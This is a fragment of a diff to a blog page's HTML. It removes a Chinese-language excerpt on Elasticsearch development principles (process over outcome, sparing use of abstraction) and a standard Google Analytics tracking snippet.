-设计特性   过程优于结果。 我们多年来一直遵循这种方法，这使我们能够随着时间的推移做出巨大的变化，而不会因大量的请求而产生巨大的响应。例如，补齐建议程序在 Elasticsearch 的早期版本中添加，而不支持实时更新和特定的删除。这意味着删除 Elasticsearch 中的文档不会立即反映在建议中。这是一个很难的问题，大约三年后，我们增加了对 Lucene 建议器和 Elasticsearch 的 bitset 过滤器的支持。与此同时，对于许多用户来说，这是一个可以接受的解决方案，修复了许多错误，并朝着基于文档的建议器发展。这就是过程优于结果。
-  为今天设计！谨慎使用抽象。 计算机科学教授教育学生以灵活性和信息隐藏的名义广泛使用抽象层。当然 Elasticsearch 广泛使用抽象; 没有任何涉及数百万行代码的项目可以以其他方式进行工作并生存。但经验表明，过度或过早的抽象可能与过早优化一样有害。抽象应该用于所需的级别，不要再进一步。</p>
-  <footer class="post-footer">
-    <a class="read-more" href="https://madneal.com/post/elasticsearch%E5%9B%A2%E9%98%9F%E5%BC%80%E5%8F%91%E7%AB%A0%E7%A8%8B/">Read More →</a>
   </footer>
 </article>
 
@@ -419,20 +430,7 @@ LICENSE: MIT
 
 
 <script src="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/js/bundle.js"></script>
-
-
-<script type="application/javascript">
-var doNotTrack = false;
-if (!doNotTrack) {
-	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
-	ga('create', 'UA-104405154-2', 'auto');
-	
-	ga('send', 'pageview');
-}
-</script>
-<script async src='https://www.google-analytics.com/analytics.js'></script>
-
-
+  
 
 
 
